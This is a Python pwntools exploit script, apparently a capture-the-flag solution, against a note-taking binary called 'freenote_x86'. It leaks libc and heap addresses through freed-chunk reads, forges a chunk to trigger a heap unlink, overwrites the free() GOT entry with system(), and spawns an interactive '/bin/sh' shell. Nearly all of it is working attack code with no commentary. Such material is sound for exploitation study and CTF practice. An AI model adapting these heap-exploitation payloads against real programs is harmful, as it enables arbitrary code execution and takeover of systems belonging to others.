#!/usr/bin/env python
from pwn import *

p = process('./freenote_x86')
#p = remote('127.0.0.1',10001)
  
def new_note(x):
    p.recvuntil("Your choice: ")
    p.send("2\n")
    p.recvuntil("Length of new note: ")
    p.send(str(len(x))+"\n")
    p.recvuntil("Enter your note: ")
    p.send(x)

def delete_note(x):
    p.recvuntil("Your choice: ")
    p.send("4\n")
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")

def list_note():
    p.recvuntil("Your choice: ")
    p.send("1\n")
    
def edit_note(x,y):
    p.recvuntil("Your choice: ")
    p.send("3\n")   
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")   
    p.recvuntil("Length of note: ")
    p.send(str(len(y))+"\n")   
    p.recvuntil("Enter your note: ")
    p.send(y)
    
####################leak libc#########################

notelen=0x80

new_note("A")
new_note("B")
delete_note(0)

new_note("A")
list_note()
p.recvuntil("0. ")
leak = p.recvuntil("\n")
leak = leak[0:4]

print leak.encode('hex')
leaklibcaddr = u32(leak)

print "leak_libc_addr = " + hex(leaklibcaddr)
delete_note(1)
delete_note(0)


system_sh_addr = leaklibcaddr - 0x167fe1
print "system_sh_addr: " + hex(system_sh_addr)
binsh_addr = leaklibcaddr - 0x45449
print "binsh_addr: " + hex(binsh_addr)

####################leak heap#########################

notelen=0x10

new_note("A"*notelen)
new_note("B"*notelen)
new_note("C"*notelen)
new_note("D"*notelen)
delete_note(2)
delete_note(0)

new_note("AAAA")
list_note()
leak = p.recvuntil("0. AAAA")
leak = p.recvuntil("\n")

leak = leak[0:4]

print leak.encode('hex')
leakheapaddr = u32(leak)

print "leak_heap_addr = " + hex(leakheapaddr)

delete_note(0)
delete_note(1)
delete_note(3)

####################unlink exp#########################

notelen = 0x80

#new_note("/bin/sh\x00"+"A"*(notelen-8))
new_note("A"*notelen)
new_note("B"*notelen)
new_note("C"*notelen)

delete_note(2)
delete_note(1)
delete_note(0)

heapbaseaddr = leakheapaddr - 0xc18
print "heapbaseaddr = " + hex(heapbaseaddr)
fd = heapbaseaddr + (0x04 * 3) #notetable
bk = fd + 0x4


payload  = ""
payload += p32(0x0) + p32(notelen+1) + p32(fd) + p32(bk) + "B" * (notelen - 0x10)
payload += p32(notelen) + p32(notelen+0x8) + "B" * notelen
payload += p32(0) + p32(notelen+0x9)+ "B" * (notelen-0x10)

print hex(len(payload))

new_note(payload)

delete_note(1)

free_got = 0x0804a29c

payload2 = p32(3) + p32(1) + p32(0x4) + p32(free_got) + "A" * 8 + p32(binsh_addr)
payload2 += "A"* (notelen*3-len(payload2))

edit_note(0, payload2)

edit_note(0, p32(system_sh_addr))

delete_note(1)

p.interactive()


